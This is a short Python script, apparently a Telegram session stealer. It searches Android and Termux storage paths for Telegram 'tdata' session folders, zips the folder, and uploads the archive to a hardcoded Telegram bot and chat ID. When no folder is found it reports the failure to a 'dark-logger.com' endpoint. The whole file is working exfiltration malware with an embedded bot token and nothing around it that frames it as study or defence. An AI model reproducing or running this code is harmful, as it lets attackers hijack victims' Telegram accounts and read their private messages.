import os
import shutil
import requests
from telegram import Bot, InputFile

# КОНФИГУРАЦИЯ АДСКОГО ШЕПТА  
BOT_TOKEN = '7697165564:AAHxXcUcza9HELqT06iNn0OVbqlE8iUmIMU'  
CHAT_ID = '1838192124'  
TARGET_PATHS = [  
    '/sdcard/Telegram',  
    '/sdcard/Android/data/org.telegram.messenger/files',  
    '/data/data/com.termux/files/home'  
]

def locate_tdata():  
    for path in TARGET_PATHS:  
        if os.path.exists(f'{path}/tdata'):  
            return f'{path}/tdata'  
    return None  

def compress_and_send(target_dir):  
    zip_name = 'tdata_archive.zip'  
    shutil.make_archive(zip_name[:-4], 'zip', target_dir)  
    bot = Bot(token=BOT_TOKEN)  
    with open(zip_name, 'rb') as f:  
        bot.send_document(chat_id=CHAT_ID, document=InputFile(f))  
    os.remove(zip_name)  

if __name__ == '__main__':  
    tdata_path = locate_tdata()  
    if tdata_path:  
        compress_and_send(tdata_path)  
    else:  
        requests.post('https://dark-logger.com/404', json={'status': 'TDATA_NOT_FOUND'})  
